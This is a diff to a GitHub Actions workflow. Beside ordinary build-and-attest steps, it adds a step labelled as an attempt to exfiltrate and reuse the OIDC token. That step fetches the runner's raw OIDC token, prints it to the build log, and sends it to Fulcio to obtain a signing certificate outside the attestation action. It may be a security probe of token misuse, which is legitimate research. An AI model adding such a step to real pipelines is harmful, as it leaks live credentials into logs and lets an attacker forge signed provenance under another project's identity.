@@ -121,6 +121,20 @@ jobs:
           push: true
           tags: ${{ steps.image.outputs.repo }}:${{ github.sha }}
 
+      - name: Attempt to exfiltrate/reuse the OIDC token
+        run: |
+          echo "Attempting to fetch a raw OIDC token directly..."
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sigstore" -o token_response.json
+          cat token_response.json
+          echo "---"
+          echo "Attempting to reuse this token against Fulcio directly, outside the attest action..."
+          curl -s -X POST https://fulcio.sigstore.dev/api/v2/signingCert \
+            -H "Content-Type: application/json" \
+            -d '{"credentials":{"oidcIdentityToken":"'"$(jq -r .value token_response.json)"'"}}' \
+            -o fulcio_response.json || true
+          cat fulcio_response.json
+
       - name: Attest build provenance
         uses: actions/attest-build-provenance@v1
         with:
